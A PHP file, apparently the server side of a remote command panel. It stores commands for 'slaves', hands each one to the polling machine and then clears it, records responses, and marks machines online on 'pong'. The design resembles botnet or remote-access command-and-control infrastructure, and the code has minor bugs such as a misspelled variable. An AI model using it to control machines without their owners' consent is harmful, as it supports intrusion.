<?php


function cleanSlaveCommand($str, $conn)
{
  $cleanCommand = $conn->prepare("update slaves set slaveCommand='', slaveLatestAction=NOW() where slaveId=?");
  if ($cleanCommand !== false)
  {
      $errorControl = $cleanCommand->bind_param("s", $str);
      if ($errorControl !== false)
      {
          $errorControl = $cleanCommand->execute();
          if ($errorControl === false)
          {return "An error occured: " . $cleanCommand->error;

          }
      }
  }
  else
  {
      return "An error occured: " . $conn->error;
  }

}



function showCommand($str, $conn)
{
    $retrieveCommand = $conn->prepare("SELECT slaveCommand from slaves where slaveId=?");
    if ($retrieveCommand !== false)
    {
        $errorControl = $retrieveCommand->bind_param("s", $str);
        if ($errorControl !== false)
        {
            $errorControl = $retrieveCommand->bind_param("s", $str);
            if ($errorControl !== false)
            {
                $errorControl = $retrieveCommand->execute();
                if ($errorControl === false) return "An error occured: " . $retrieveCommand->error;
                else
                {
                    $retrieveCommand->store_result();

                    if ($retrieveCommand->num_rows > 0)
                    {
                        $retrieveCommand->bind_result($slaveCommand);
                        $retrieveCommand->fetch();
                        cleanSlaveCommand($str, $conn);
			return $slaveCommand;
                    }
                }
            }
            else
            {
                return "An error occured: " . $retrieveCommand->error;
            }
        }
        else
        {
            return "An error occured: " . $retrieveCommand->error;
        }

    }
    else
    {
        return "An error occured: " . $conn->error;
    }

}

function retrieveResponse($response, $str, $conn)
{

    if ($response != "pong")
    {
        $retrieveResponse = $conn->prepare("update slaves set slaveResponse = ?, slaveLatestAction=NOW() where slaveId=?");
        if ($retrieveResponse !== false)
        {
            $errorControl = $retrieveResponse->bind_param("ss", $response, $str);
            if ($errorControl !== false)
            {
                $errorControl = $retrieveResponse->execute();
                if ($errorControl === false)
                {
                    return "An error occured: " . $retrieveResponse->error;
                }
            }
            else
            {
                return "An error occured: " . $retrieveResponse->error;
            }
        }
        else
        {
            return "An error occured: " . $conn->error;
        }

    }
    else
    {
        $setResponse = $conn->prepare("update slaves set slaveStatus='online' where slaveId=?");
        if ($setResponse !== false)
        {
            $errorControl = $setResponse->bind_param("s", $str);
            if ($errorControl !== false)
            {
                $errorControl = $setResponse->execute();
                if ($errorControl === false)
                {
                    return "An error occured: " . $setReponse->error;
                }
            }
            else
            {
                return "An error occured: " . $setReponse->error;
            }
        }
        else
        {
            return "An error occured: " . $conn->error;
        }

    }
}

?>
